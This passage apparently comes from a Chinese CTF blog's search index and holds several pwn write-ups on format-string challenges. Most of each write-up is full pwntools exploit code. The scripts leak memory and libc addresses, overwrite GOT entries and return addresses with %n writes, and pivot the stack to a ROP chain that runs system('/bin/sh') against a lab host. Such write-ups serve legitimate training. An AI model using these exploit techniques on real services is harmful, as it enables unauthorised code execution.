info\rprint(\u0026#39;leak_addr = \u0026#39;,hex(b_addr))\r#print(\u0026#39;res = \u0026#39;,res)\rprint(\u0026#34;dump length is: \u0026#34;, len(res))\rwith open(\u0026#34;dump_file2\u0026#34;, \u0026#34;wb\u0026#34;) as f:\rf.","title":"format2_new"},{"content":"这道题是一道blind-pwn，也就是盲打。不会提供binary，需要我们利用格式化字符串对binary进行泄露。因为格式化字符串泄露的为内存空间，所以泄露出来的binary可能会存在混乱、残缺等问题。\n首先我们先连接一下这道题：\n注：因为32位的远程连接已经替换为64位，所以我们使用本地文件模拟泄露。 打开文件后，显示字符串“ping me”\n然后我们随意输入字符，程序都会输出我们输入的字符：\n如果不输入字符串直接回车的话，就会显示哭泣：\n那么根据格式化字符串的原理，我们需要知道其偏移量，也就是我们输入的字符串是放在相对于格式化字符串的第几个参数。\n我们使用下面的指令查看：\naaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以看到，是第七个参数。\n我们再尝试输入\nbbbb%7$p 程序讲bbbb的十六进制输出了出来，证明偏移量的确是7。\n知道了偏移量接下来就是泄露binary文件：\nfrom pwn import *\rproc = \u0026#39;./format2\u0026#39;\rdef leak(b_addr , a):\rp = process(proc)\rpad = b\u0026#39;%9$s.tmp\u0026#39;+p32(b_addr)\rp.sendline(pad)\rp.recvuntil(\u0026#39;me\u0026#39;)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rinfo = p.recvuntil(\u0026#39;.tmp\u0026#39;, drop=True)\rif not info :\rinfo = b\u0026#34;\\x00\u0026#34;\rp.close()\rreturn info\rb_addr = 0x8048000\rb_end = 0x0804A000\rres = b\u0026#39;\u0026#39;\ra = 0\rtry:\rwhile b_addr \u0026lt;= b_end:\rinfo = b\u0026#39;\u0026#39;\rprint(\u0026#39;leak2 = \u0026#39;,info)\rinfo = leak(b_addr,a)\rprint(\u0026#39;leak = \u0026#39;,info)\ra +=1\rb_addr += len(info)\rres += info\rprint(\u0026#39;leak_addr = \u0026#39;,hex(b_addr))\r#print(\u0026#39;res = \u0026#39;,res)\rexcept Exception as e:\rprint(e)\tprint(\u0026#34;dump length is: \u0026#34;, len(res))\rwith open(\u0026#34;dump_file1\u0026#34;, \u0026#34;wb\u0026#34;) as f:\rf.write(res) 将dump下来的文件放入IDA，并设置偏移量： 进入IDA后，我们可以看到前四个自己一定是\\x7FELf，这就表明我们dump下来的是一个ELF文件。\n因为我们dump的是内存中的内容，所以和原本的二进制文件存在巨大的差异。因此，我们在IDA中观察dump下来的文件时，需要结合经验和大胆猜测：\n例如下图两个位置，就与.plt段相似\n而下图结合字符串（“ping me”），我们可以猜测这里是主函数：\n由于这是32位程序，所以我们可以看到程序是将“ping me”压入栈，然后调用loc_8048430。\n所以这里我们可以猜测loc_8048430可能就是printf函数。但是根据后面的推测，我们可以判断，这其实不是printf函数，而更有可能是puts函数。\n具体原因是，上面我们运行文件时，知道了如果不输入字符串直接回车会输出“;(” ，这俩个字符。说明文件存在一个判断点，来判断输入是否为空。而红框中确实有一个jz指令让函数跳转。\n由此我们就可以判断上面的sub_8048588这个函数是一个判断函数，判断输入不为空后，就将输入进行输出。而下方的sub_8048400则是输出函数。我们跟随来到如图所示：\n到这里，我们就可以猜测这是printf函数了，并且got表为0x8049974\n找到got里的printf函数的地址后，我们需要利用格式化字符串泄露服务器端的printf函数的地址\n注：因为32位的远程连接已经替换为64位，这里我们还是使用的本地连接。 from pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rsh = process(\u0026#39;./format2\u0026#39;)\r#sh = remote(\u0026#34;10.0.25.109\u0026#34;,20001)\rprintf_got = 0x8049974\rpayload1 = b\u0026#39;%8$s\u0026#39;+p32(printf_got)\rsh.sendline(payload1)\rleak = u32(sh.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\rprint(\u0026#39;leak = \u0026#39;,hex(leak)) 这样我们就泄露出了printf函数的地址，然后查找libc的版本：\n因为我们只输出了printf函数的地址，所以会导致libc版本较多，只有一个一个的试试。\n最后我们发现这个版本的libc是正确的。\n然后我们知道了system函数地址，我们需要将got表里存放的printf函数地址改成system函数的地址。\n这里我们使用到的是\n%k$n;\t//不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针所指向的变量。\r%k$hhn;\t//输出一个字节\r%k$hn;\t//输出两个字节\r%k$ln;\t//输出四个字节\r%k$lln;\t//输出八个字节 利用上面这的格式化字符串可以将对应的地址存放的值变为我们需要的值。\n但是由于偏移量计算较为麻烦。所以我们这里使用pwntools里集成工具：\npwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=\u0026#39;byte\u0026#39;) 我们可以通过pwntools的文档来查看这个工具：https://docs.pwntools.com/en/latest/fmtstr.html?highlight=fmtstr_payload\nfmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)\r第一个参数表示格式化字符串的偏移；\r第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printf_GOT:\rsystemAddress}；\r第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；\r第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。\rfmtstr_payload函数返回的就是payload 完整的exp：\n#format2\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rsh = process(\u0026#39;./format2\u0026#39;)\r#sh = remote(\u0026#34;10.0.25.109\u0026#34;,20001)\rprintf_got = 0x8049974\rpayload1 = b\u0026#39;%8$s\u0026#39;+p32(printf_got)\rsh.sendline(payload1)\rleak = u32(sh.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\rprint(\u0026#39;leak = \u0026#39;,hex(leak))\rlibc_base = leak - 0x502a0\rsys_addr = libc_base + 0x41790\rprint(\u0026#39;libc_base = \u0026#39;,hex(libc_base))\rprint(\u0026#39;sys_addr = \u0026#39;,hex(sys_addr))\r#gdb.attach(sh)\rpayload2 = fmtstr_payload(7, {printf_got: sys_addr},write_size=\u0026#39;short\u0026#39;)\rprint(\u0026#39;payload = \u0026#39;,payload2)\rsh.sendline(payload2)\rsleep(0.2)\rsh.sendline(\u0026#39;/bin/sh\\x00\u0026#39;)\rsh.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format2_old/","summary":"这道题是一道blind-pwn，也就是盲打。不会提供binary，需要我们利用格式化字符串对binary进行泄露。因为格式化字符串泄露的为内存空间，所以泄露出来的binary可能会存在混乱、残缺等问题。\n首先我们先连接一下这道题：\n注：因为32位的远程连接已经替换为64位，所以我们使用本地文件模拟泄露。 打开文件后，显示字符串“ping me”\n然后我们随意输入字符，程序都会输出我们输入的字符：\n如果不输入字符串直接回车的话，就会显示哭泣：\n那么根据格式化字符串的原理，我们需要知道其偏移量，也就是我们输入的字符串是放在相对于格式化字符串的第几个参数。\n我们使用下面的指令查看：\naaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以看到，是第七个参数。\n我们再尝试输入\nbbbb%7$p 程序讲bbbb的十六进制输出了出来，证明偏移量的确是7。\n知道了偏移量接下来就是泄露binary文件：\nfrom pwn import *\rproc = \u0026#39;./format2\u0026#39;\rdef leak(b_addr , a):\rp = process(proc)\rpad = b\u0026#39;%9$s.tmp\u0026#39;+p32(b_addr)\rp.sendline(pad)\rp.recvuntil(\u0026#39;me\u0026#39;)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rinfo = p.recvuntil(\u0026#39;.tmp\u0026#39;, drop=True)\rif not info :\rinfo = b\u0026#34;\\x00\u0026#34;\rp.close()\rreturn info\rb_addr = 0x8048000\rb_end = 0x0804A000\rres = b\u0026#39;\u0026#39;\ra = 0\rtry:\rwhile b_addr \u0026lt;= b_end:\rinfo = b\u0026#39;\u0026#39;\rprint(\u0026#39;leak2 = \u0026#39;,info)\rinfo = leak(b_addr,a)\rprint(\u0026#39;leak = \u0026#39;,info)\ra +=1\rb_addr += len(info)\rres += info\rprint(\u0026#39;leak_addr = \u0026#39;,hex(b_addr))\r#print(\u0026#39;res = \u0026#39;,res)\rexcept Exception as e:\rprint(e)\tprint(\u0026#34;dump length is: \u0026#34;, len(res))\rwith open(\u0026#34;dump_file1\u0026#34;, \u0026#34;wb\u0026#34;) as f:\rf.","title":"format2_old"},{"content":"首先检查保护机制：\n不能修改got表，有栈溢出检测\n接着运行一下程序：\n程序会让我们分别输入两次，然后再打印分别将两次输入打印出来。\n我们输入什么就会输出什么，这里可能存在格式化字符串的漏洞，我们接下来将二进制文件拖进IDA中：\n在IDA中我们很容易看到，在main函数里调用了有两个格式化漏洞的函数。同时为了方便下文引用，将这个函数重命名为func。\n同时，我们也可以在文件中找到一个system函数：\n那么现在这道题思路就是：\n1. 利用第一个printf函数泄露func函数的rbp\n2. 通过rbp，定位存放func函数的返回地址的地址\n3. 利用第二个printf函数的格式化字符串漏洞，修改返回地址为system函数\n首先我们泄露main函数调用func函数时，压入的rbp。\n我们进入gdb，将断点打在func函数处，然后步进到第一个printf函数处，然后查看栈信息：\n可以看到rbp相对于格式化字符串的偏移量为：44，所以我们泄露rbp的exp为：\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rpayload = \u0026#39;%44$p\u0026#39;\rsys_addr = 0x400817\r#gdb.attach(p)\t//因为内存地址随时会变，所以需要进入gdb查看输出是否正确\rp.recvuntil(\u0026#39;name:\u0026#39;)\rp.sendline(payload)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rleak = int(p.recvuntil(\u0026#39;Please\u0026#39;,drop = True),base = 16)\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\t//泄露出来的rbp\rret_addr = leak - 0x8\t//rbp的地址减去8，就是func函数返回地址所在值\rprint(\u0026#39;ret_addr =\u0026#39;,hex(ret_addr)) 可以看到无论是泄露的内存地址，还是存放func返回值的地址都是匹配的。\n然后我们就需要利用第二个printf函数将返回值改为system函数的地址：\n可以看到返回值为0x40098c，system函数地址为0x400817只有两个字节不同，所以我们使用%hn进行修改\n0x0817 = 2071，所以我们需要输出2071个字符\npayload2 =b\u0026#39;%2071c%12$hnaaaa\u0026#39; //最后四个‘a’,是用来填充内存的，试内存得以对齐\rpayload2 += p64(ret_addr) 完整的exp：\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rpayload = \u0026#39;%44$p\u0026#39;\rsys_addr = 0x400817\r#gdb.attach(p)\rp.recvuntil(\u0026#39;name:\u0026#39;)\rp.sendline(payload)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rleak = int(p.recvuntil(\u0026#39;Please\u0026#39;,drop = True),base = 16)\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\rret_addr = leak - 0x8\rprint(\u0026#39;ret_addr =\u0026#39;,hex(ret_addr))\r#---------------------------第二次输入---------------------------------\r#gdb.attach(p)\rpayload2 =b\u0026#39;%2071c%12$hnaaaa\u0026#39;+p64(ret_addr)\rp.sendline(payload2)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format3_new/","summary":"首先检查保护机制：\n不能修改got表，有栈溢出检测\n接着运行一下程序：\n程序会让我们分别输入两次，然后再打印分别将两次输入打印出来。\n我们输入什么就会输出什么，这里可能存在格式化字符串的漏洞，我们接下来将二进制文件拖进IDA中：\n在IDA中我们很容易看到，在main函数里调用了有两个格式化漏洞的函数。同时为了方便下文引用，将这个函数重命名为func。\n同时，我们也可以在文件中找到一个system函数：\n那么现在这道题思路就是：\n1. 利用第一个printf函数泄露func函数的rbp\n2. 通过rbp，定位存放func函数的返回地址的地址\n3. 利用第二个printf函数的格式化字符串漏洞，修改返回地址为system函数\n首先我们泄露main函数调用func函数时，压入的rbp。\n我们进入gdb，将断点打在func函数处，然后步进到第一个printf函数处，然后查看栈信息：\n可以看到rbp相对于格式化字符串的偏移量为：44，所以我们泄露rbp的exp为：\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rpayload = \u0026#39;%44$p\u0026#39;\rsys_addr = 0x400817\r#gdb.attach(p)\t//因为内存地址随时会变，所以需要进入gdb查看输出是否正确\rp.recvuntil(\u0026#39;name:\u0026#39;)\rp.sendline(payload)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rleak = int(p.recvuntil(\u0026#39;Please\u0026#39;,drop = True),base = 16)\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\t//泄露出来的rbp\rret_addr = leak - 0x8\t//rbp的地址减去8，就是func函数返回地址所在值\rprint(\u0026#39;ret_addr =\u0026#39;,hex(ret_addr)) 可以看到无论是泄露的内存地址，还是存放func返回值的地址都是匹配的。\n然后我们就需要利用第二个printf函数将返回值改为system函数的地址：\n可以看到返回值为0x40098c，system函数地址为0x400817只有两个字节不同，所以我们使用%hn进行修改\n0x0817 = 2071，所以我们需要输出2071个字符\npayload2 =b\u0026#39;%2071c%12$hnaaaa\u0026#39; //最后四个‘a’,是用来填充内存的，试内存得以对齐\rpayload2 += p64(ret_addr) 完整的exp：\nfrom pwn import *\rcontext.","title":"format3_new"},{"content":"首先查看保护机制：\n可以看到got表不能修改，没有栈溢出检查和地址随机化\n按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。\n运行程序首先是打印几排字符串，让我们先注册：\n我们注册后会显示注册成功：\n然后跳出菜单让我们选择：\n三个选项，如果输入1，就会显示我们刚刚注册的账户：\n如果选择2，则会让我们重新输入username和password：\n如果选择3，则会退出。\n然后我们再进入IDA中查看：\n这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。\n通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。\n我们在IDA中找到输出账户和密码的函数：\n可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。\n同时，我们可以在IDA中找到，system函数：\n然后我们进入gdb，断点打在show函数处，查看偏移量：\n可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。\n那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。\n我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：\n0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。\n所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rbinary=ELF(\u0026#34;format3\u0026#34;)\r#gdb.attach(sh)\rp.recvuntil(\u0026#39;Input your username(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;.tmp\u0026#39;)\rp.recvuntil(\u0026#39;Input your password(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;%6$p\u0026#39;)\rp.recvuntil(\u0026#39;Register Success!!\\n\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;.tmp\\n\u0026#39;)\rrbp = int(p.recvline(),base = 16)\rprint(\u0026#39;rbp = \u0026#39;,hex(rbp))\rret_addr = rbp - 0x38\rprint(\u0026#39;ret_addr = \u0026#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。\n我们需要将0x400d74改为0x4008A6\n因为只有最后两个字节不同，所以我们使用\n$hn 又因为我们需要将0x0d74改为0x08A6，所以我们需要输出0x08A6个字符，也就是2214个字符\n%2214c$hn 完整的exp：\n#format3\rfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rbinary=ELF(\u0026#34;format3\u0026#34;)\r#gdb.attach(sh)\rp.recvuntil(\u0026#39;Input your username(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;.tmp\u0026#39;)\rp.recvuntil(\u0026#39;Input your password(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;%6$p\u0026#39;)\rp.recvuntil(\u0026#39;Register Success!!\\n\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;.tmp\\n\u0026#39;)\rrbp = int(p.recvline(),base = 16)\rprint(\u0026#39;rbp = \u0026#39;,hex(rbp))\rret_addr = rbp - 0x38\rprint(\u0026#39;ret_addr = \u0026#39;,hex(ret_addr))\r#---------------------------第二次输入---------------------------------\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;please input new username(max lenth:20):\u0026#39;)\rp.sendline(p64(ret_addr))\rp.recvuntil(\u0026#39;please input new password(max lenth:20):\u0026#39;)\rp.writeline(\u0026#34;%2214c%8$hn\u0026#34;)\r#---------------------------第三次输入---------------------------------\rp.sendline(\u0026#39;1\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format3_old/","summary":"首先查看保护机制：\n可以看到got表不能修改，没有栈溢出检查和地址随机化\n按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。\n运行程序首先是打印几排字符串，让我们先注册：\n我们注册后会显示注册成功：\n然后跳出菜单让我们选择：\n三个选项，如果输入1，就会显示我们刚刚注册的账户：\n如果选择2，则会让我们重新输入username和password：\n如果选择3，则会退出。\n然后我们再进入IDA中查看：\n这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。\n通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。\n我们在IDA中找到输出账户和密码的函数：\n可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。\n同时，我们可以在IDA中找到，system函数：\n然后我们进入gdb，断点打在show函数处，查看偏移量：\n可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。\n那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。\n我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：\n0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。\n所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rbinary=ELF(\u0026#34;format3\u0026#34;)\r#gdb.attach(sh)\rp.recvuntil(\u0026#39;Input your username(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;.tmp\u0026#39;)\rp.recvuntil(\u0026#39;Input your password(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;%6$p\u0026#39;)\rp.recvuntil(\u0026#39;Register Success!!\\n\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;.tmp\\n\u0026#39;)\rrbp = int(p.recvline(),base = 16)\rprint(\u0026#39;rbp = \u0026#39;,hex(rbp))\rret_addr = rbp - 0x38\rprint(\u0026#39;ret_addr = \u0026#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。","title":"format3_old"},{"content":"首先我们查看保护机制：\n可以看到，打开了canary。\n接着我们运行程序：\n程序的功能类似于一个记事本，输入‘1’添加消息，输入‘2’显示输入的消息。\n因为程序会输出我们输入的东西，那么就有可能存在格式化字符串漏洞，我们输入连续的.%P进行尝试：\n可以看到输出了内存中的值，那么我们就可以利用这个格式化字符串漏洞。\n要利用格式化字符串漏洞，我们需要知道偏移量，这里我们进入gdb进行调试。\n这里我们在格式化字符串漏洞处下断点（格式化字符串漏洞的地址可以在ida中进行查看）：\n然后将程序跑起来：\n输入message后，再选择“Show Message”。gdb就会将程序断在断点处：\n我们可以看到，程序并没有将我们输入的字符串存放在栈中，而是存放在了一个很明显不是栈的地址。\n通过vmmap指令，我们可以知道，这个地址是在堆中：\n存放在了堆上，我们就不能通过泄露canary覆盖返回地址的方法了。\n虽然我们不能使用栈溢出覆盖返回地址，但是我们可以使用leave栈迁移的方法，将栈转移到一个虚假的栈上。\nleave = MOV RSP, RBP\rPOP RBP 通过这个指令会将RBP的值赋给RSP，那么如果我们将栈中的RBP的值给修改了，运行到leave指令时，RSP就会转跳到我们指定的地址。\n所以，我们通过程序的写入功能，在堆上写入一个ROP链，使用格式化字符串的写入功能，改变RBP。然后利用leave指令，将栈迁移到ROP链的地址上。\n使用这个方法，我们需要先泄露libc的版本，找到基地址、system函数的地址和“/bin/sh”字符串的地址。\n在gdb中我们可以看到__libc_start_main函数的偏移量：\n偏移量为0xf+6=21。\n注：这里我们泄露出来的不是（______libc_start_main）而是（__libc_start_main+240）,所以泄露出来的地址需要减去240 from pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;format4\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rpop_rdi_ret = 0x400c03\rdef add(payload):\rlenth = len(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Please enter your message length:\u0026#39;)\rp.sendline(str(lenth))\rp.recvuntil(\u0026#39;Please enter your Message:\u0026#39;)\rp.sendline(payload)\r#--------------------------------第一次输入--------------------------------------\rpayload = b\u0026#39;%21$p.tmp\u0026#39;\radd(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Message3: 0x\u0026#39;)\rleak = int(p.recvuntil(\u0026#39;.tmp\u0026#39;,drop = True),base=16)-240\rprint(hex(leak)) 然后通过后12位找到libc版本，然后计算基地址和system函数的地址：\nlibc_base = leak - 0x20750\rsys_addr = libc_base + 0x453A0\rbin_addr = libc_base + 0x18CE57\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\rprint(\u0026#39;libc_base =\u0026#39;,hex(libc_base))\rprint(\u0026#39;sys_addr =\u0026#39;,hex(sys_addr))\rprint(\u0026#39;bin_addr =\u0026#39;,hex(bin_addr)) 现在知道函数地址了，我们需要知道我们输入的字符串存放在哪里。其实在上面展示栈的布局的图片上，就已经看得出来，地址是存在于格式化字符串偏移量为6的栈中。\n这里我们直接使用%6$p将其输出出来。\n#--------------------------------第二次输入--------------------------------------\rpayload2 = b\u0026#39;%6$p.tmn\u0026#39;\radd(payload2)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recv()\rp.recvuntil(\u0026#39;Message1: \u0026#39;)\rrbp = int(p.recvuntil(\u0026#39;.tmn\u0026#39;,drop = True),base = 16)+0x18\rprint(hex(rbp)) 注：代码的RBP后加了0x18，这里是为了实现内存对齐。因为我们泄露的堆上的地址是随机的，为了保证后面system函数的运行，需要让假rbp对齐0x10或者是0x8。具体的对齐算法在后面。 现在知道了我们输入的字符串放在哪里了，接下来我们就需要将假栈写入堆中：\n#--------------------------------第三次输入--------------------------------------\r#内存对齐算法：\rpadding_rbp = 0x10-(rbp%0x10) //计算rbp的最后一位，并计算需要填充几个值才能对齐0x10\rprint(hex(padding_rbp))\rif padding_rbp == 0x10:\t//如果rbp本身与0x10对齐，则不填充\rpadding_rbp = 0\rprint(hex(padding_rbp))\rpayload3 = b\u0026#39;c\u0026#39;*padding_rbp+b\u0026#39;d\u0026#39;*8 + p64(pop_rdi_ret)+ p64(bin_addr)+ p64(sys_addr)\rrbp_done = rbp+4+padding_rbp+8\t//ROP最终存放的地址\radd(payload3)\rprint(hex(rbp_done)) 这里输出的则是对齐后的，假栈的地址。\n现在我们已经将假栈放入堆中，接下来就需要将rbp改为假栈的地址，然后利用程序的leave指令，使rsp跳转到我们指定的栈就好了。\n我们也知道，RBP的值就存放在栈中，所以我们直接使用格式化字符串进行修改，偏移量为8：\n#--------------------------------第四次输入--------------------------------------\rpayload4 = \u0026#39;%\u0026#39;+str(rbp_done-4)+\u0026#39;c%8$lln.tmo\u0026#39;\radd(payload4)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;.tmo\u0026#39;)\r#p.sendline(\u0026#39;3\u0026#39;)\rp.interactive() 最终的exp：\nfrom pwn import *\r#context.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;format4\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rdef add(payload):\rlenth = len(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Please enter your message length:\u0026#39;)\rp.sendline(str(lenth))\rp.recvuntil(\u0026#39;Please enter your Message:\u0026#39;)\rp.sendline(payload)\r#--------------------------------填充栈--------------------------------------\rpadding = \u0026#39;a\u0026#39;*0x180\radd(padding)\radd(padding)\radd(padding)\r#--------------------------------第一次输入--------------------------------------\rpop_rdi_ret = 0x400c03\r#gdb.attach(p)\tpayload = b\u0026#39;%21$p.tmp\u0026#39;\radd(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Message3: 0x\u0026#39;)\rleak = int(p.recvuntil(\u0026#39;.tmp\u0026#39;,drop = True),base=16)-240\rlibc_base = leak - 0x20750\rsys_addr = libc_base + 0x453A0\rbin_addr = libc_base + 0x18CE57\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\rprint(\u0026#39;libc_base =\u0026#39;,hex(libc_base))\rprint(\u0026#39;sys_addr =\u0026#39;,hex(sys_addr))\rprint(\u0026#39;bin_addr =\u0026#39;,hex(bin_addr))\r#--------------------------------第二次输入--------------------------------------\rpayload2 = b\u0026#39;%6$p.tmn\u0026#39;\radd(payload2)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recv()\rp.recvuntil(\u0026#39;Message4: \u0026#39;)\rrbp = int(p.recvuntil(\u0026#39;.tmn\u0026#39;,drop = True),base = 16)+0x18\rprint(hex(rbp))\r#--------------------------------第三次输入--------------------------------------\rpadding_rbp = 0x10-(rbp%0x10)\rprint(hex(padding_rbp))\rif padding_rbp == 0x10:\rpadding_rbp = 0\rprint(hex(padding_rbp))\rpayload3 = b\u0026#39;c\u0026#39;*padding_rbp+b\u0026#39;d\u0026#39;*8 + p64(pop_rdi_ret)+ p64(bin_addr)+ p64(sys_addr)\rrbp_done = rbp+4+padding_rbp+8\radd(payload3)\rprint(hex(rbp_done))\r#--------------------------------第四次输入--------------------------------------\rpayload4 = \u0026#39;%\u0026#39;+str(rbp_done-4)+\u0026#39;c%8$lln.tmo\u0026#39;\radd(payload4)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;.tmo\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format4_new/","summary":"首先我们查看保护机制：\n可以看到，打开了canary。\n接着我们运行程序：\n程序的功能类似于一个记事本，输入‘1’添加消息，输入‘2’显示输入的消息。\n因为程序会输出我们输入的东西，那么就有可能存在格式化字符串漏洞，我们输入连续的.%P进行尝试：\n可以看到输出了内存中的值，那么我们就可以利用这个格式化字符串漏洞。\n要利用格式化字符串漏洞，我们需要知道偏移量，这里我们进入gdb进行调试。\n这里我们在格式化字符串漏洞处下断点（格式化字符串漏洞的地址可以在ida中进行查看）：\n然后将程序跑起来：\n输入message后，再选择“Show Message”。gdb就会将程序断在断点处：\n我们可以看到，程序并没有将我们输入的字符串存放在栈中，而是存放在了一个很明显不是栈的地址。\n通过vmmap指令，我们可以知道，这个地址是在堆中：\n存放在了堆上，我们就不能通过泄露canary覆盖返回地址的方法了。\n虽然我们不能使用栈溢出覆盖返回地址，但是我们可以使用leave栈迁移的方法，将栈转移到一个虚假的栈上。\nleave = MOV RSP, RBP\rPOP RBP 